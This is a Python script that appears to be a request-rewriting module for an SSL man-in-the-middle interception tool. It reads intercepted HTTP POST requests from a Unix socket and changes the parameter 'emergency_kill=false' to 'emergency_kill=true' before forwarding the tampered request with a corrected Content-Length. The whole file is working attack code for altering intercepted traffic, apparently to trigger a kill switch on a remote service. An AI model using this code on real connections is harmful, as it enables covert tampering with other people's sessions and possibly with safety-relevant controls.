#!/usr/bin/python

def manipulate(client_ip,client_port,server_ip,server_port,http_request):
  lines = http_request.splitlines(True)
  fields = {}
  fields["data"] = ""
  for line in lines:
    if line[:4] == "POST":
      fields["req_type"] = line
    elif line[:12] == "Content-Type":
      fields["cont_type"] = line
    elif line.strip():
      fields["data"] = line
  fields["data"] = fields["data"].replace("emergency_kill=false", "emergency_kill=true")
  new_request = fields["req_type"] + "Content-Length: " + str(len(fields["data"])) + "\r\n" + fields["cont_type"] + "\r\n" + fields["data"]
  return new_request

################################################################################
############### Under no circumstances, EVER, should you #######################
############### need to modify anything below this line  #######################
################################################################################

import os
import select
import socket
from struct import *

SOCK="/tmp/pysslsniff.sock"

try:
  os.unlink(SOCK)
except:
  pass

serv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
serv.bind(SOCK)
serv.listen(1)
fds = [serv]
meta = {}

while fds:
  selres = select.select(fds, [], fds)

  # Selected for read
  for fd in selres[0]:
    if fd == serv:
      # Read on a server means accept
      con, address = serv.accept()
      meta[con] = list(unpack('=IHIH', con.recv(12)))
      meta[con][0] = socket.inet_ntop(socket.AF_INET, pack('!I', meta[con][0]))
      meta[con][2] = socket.inet_ntop(socket.AF_INET, pack('!I', meta[con][2]))
      fds += [con]
    else:
      # Data ready!
      try:
        # Read it
        l = unpack('I', fd.recv(4))[0]
        r = fd.recv(l)
        # Manipulate
        r = manipulate(meta[fd][0], meta[fd][1], meta[fd][2], meta[fd][3], r)
        # Return it
        fd.send(pack('I', len(r)))
        fd.send(r)
      except:
        # It probably closed on us, get rid of it
        fd.close()
        fds.remove(fd)

  # Selected for error
  for fd in selres[2]:
    if fd == serv:
      # Error on server => let's exit
      for ifd in fds:
        ifd.close()
      exit()
    else:
      # It probably closed on us, get rid of it
      fd.close()
      fds.remove(fd)

